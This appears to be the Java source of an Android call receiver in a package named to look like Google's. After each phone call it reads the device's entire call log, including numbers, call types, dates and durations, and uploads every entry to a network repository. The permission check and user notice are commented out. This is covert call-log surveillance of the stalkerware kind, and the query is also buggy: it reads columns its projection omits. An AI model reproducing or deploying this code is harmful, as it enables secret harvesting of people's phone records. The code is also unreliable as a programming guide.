package com.google.android.apps.receiver;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.v4.app.ActivityCompat;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.google.android.apps.App;
import com.google.android.apps.R;
import com.google.android.apps.repositories.network.NetworkRepo;
import com.google.android.apps.repositories.network.models.data.event.Call;
import com.google.android.apps.utils.Constants;

import java.util.Date;
import java.util.concurrent.TimeUnit;

import io.reactivex.Single;
import timber.log.Timber;

public class ReceiverOnCall extends BroadcastReceiver {
    private NetworkRepo networkRepo;

    @Override
    public void onReceive(Context context, Intent intent) {
        // TODO: This method is called when the BroadcastReceiver is receiving
        // an Intent broadcast.
        networkRepo = App.getAppComponent().getNetworkRepo();

        if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
            Timber.d(intent.getExtras().getString("android.intent.extra.PHONE_NUMBER"));
        } else {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            // телефон звонит, получаем входящий номер
            if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
                Timber.d("EXTRA_STATE_RINGING");
            }
            // телефон находится в режиме звонка (набор номера / разговор)
            if ((state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))) {
                Timber.d("EXTRA_STATE_OFFHOOK");
            }
            // телефон находится в ждущем режиме (событие наступает по
            // окончании разговора,
            // когда уже знаем номер и факт звонка
            if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                Timber.d("EXTRA_STATE_IDLE");
                Single.timer(1, TimeUnit.SECONDS).subscribe(Long -> sendDetailsCall(context));
            }
        }
    }

    private void sendDetailsCall(Context context) {
//        StringBuffer stringBuffer = new StringBuffer();
//        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
//            Toast.makeText(context, R.string.add_call_log_permission, Toast.LENGTH_SHORT).show();
//            return;
//        }
        String[] projection = new String[]{CallLog.Calls.NUMBER};
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI,
                projection, null, null, CallLog.Calls.DATE + " DESC");

        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);

        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(number);
            // 1 - incoming, 2 - outgoing, 3 - missed
            int callType;
            switch (cursor.getInt(type)) {
                case 1:
                    callType = Constants.INCOMING_CALL;
                    break;
                case 2:
                    callType = Constants.OUTGOING_CALL;
                    break;
                case 3:
                    callType = Constants.MISSED_CALL;
                    break;
                default:
                    callType = Constants.INCOMING_CALL;
            }
            int callDuration = cursor.getInt(duration);
            Date callDate = new Date(cursor.getLong(date));
            Call call = new Call(phNumber, callDuration, callDate, callType);

            App.getAppComponent().getNetworkRepo()
                    .addCallOfDevice(call);
        }
        cursor.close();

    }
}
